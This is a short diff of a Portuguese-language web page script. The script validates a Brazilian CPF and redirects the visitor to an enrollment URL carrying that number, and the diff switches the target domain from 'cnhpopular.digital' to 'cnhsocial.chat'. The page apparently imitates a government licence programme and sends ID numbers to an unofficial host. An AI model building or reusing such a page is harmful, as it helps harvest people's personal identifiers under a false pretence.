@@ -166,7 +166,7 @@
         const cpfRaw = cpfFormatted.replace(/\D/g, ""); // Remove a formatação, deixando só os números
 
         if (isValidCPF(cpfRaw)) { // Valida o CPF
-            const urlSendbot = "https://portal.cnhpopular.digital/br/inscricao/?cpf=" + cpfRaw;
+            const urlSendbot = "https://portal.cnhsocial.chat/br/inscricao/?cpf=" + cpfRaw;
             window.location.href = urlSendbot; // Redireciona para a URL
         } else {
             messageError.textContent = "CPF inválido. Por favor, insira um CPF válido.";
@@ -177,3 +177,4 @@
 </body>
 
 </html>
+
